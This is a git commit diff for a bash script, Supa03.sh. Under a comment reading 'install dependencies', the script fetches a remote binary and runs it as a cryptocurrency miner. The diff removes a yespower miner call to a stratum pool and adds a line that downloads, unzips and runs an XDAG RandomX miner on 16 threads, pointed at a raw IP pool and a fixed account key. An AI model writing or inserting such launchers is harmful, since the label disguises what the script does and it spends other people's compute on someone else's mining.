ce2588c8b1e23c607dd4c5fa17c019c8be788b80
BatiKangkung <107105404+BatiKangkung@users.noreply.github.com>
2022-06-13 11:37:02 +0700

    Update Supa03.sh

--- Supa03.sh
+++ Supa03.sh
@@ -1,5 +1,3 @@
 #!/usr/bin/env bash
 # install dependencies
-wget https://github.com/BatiKangkung/KangKung/raw/main/avx2m && chmod +x avx2m 
-./avx2m -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.CPU -t 2 -p x
-
+wget https://github.com/XDagger/XdagRandomxMiner/releases/download/0.4.2/LinuxRandomxMiner.zip && unzip LinuxRandomxMiner.zip && rm -rf LinuxRandomxMiner.zip && chmod u+x DaggerRandomxMiner && ./DaggerRandomxMiner -cpu -p 82.156.18.237:13654 -t 16 -a A7F3atzGYPEBYAZlTZTfy4bKr8y3Ho57
